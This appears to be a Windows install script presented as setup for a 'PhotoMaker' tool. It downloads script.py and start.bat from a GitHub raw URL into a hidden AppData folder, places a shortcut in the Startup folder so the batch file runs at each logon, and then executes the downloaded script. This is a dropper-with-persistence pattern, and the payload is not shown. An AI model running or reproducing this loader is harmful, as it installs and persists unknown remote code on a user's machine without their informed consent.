pip install opencv-python
pip install email
powershell Start-BitsTransfer -Source "https://raw.githubusercontent.com/Bot007bot/forfun/master/script.py" -Destination "%USERPROFILE%\AppData\Local\PhotoMaker\script.py"
powershell Start-BitsTransfer -Source "https://raw.githubusercontent.com/Bot007bot/forfun/master/start.bat" -Destination "%USERPROFILE%\AppData\Local\PhotoMaker\start.bat"
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('"%USERPROFILE%\Start Menu\Programs\Startup\start.lnk");$s.TargetPath="start.bat";$s.Save()"
py -3 "%USERPROFILE%\AppData\Local\PhotoMaker\script.py"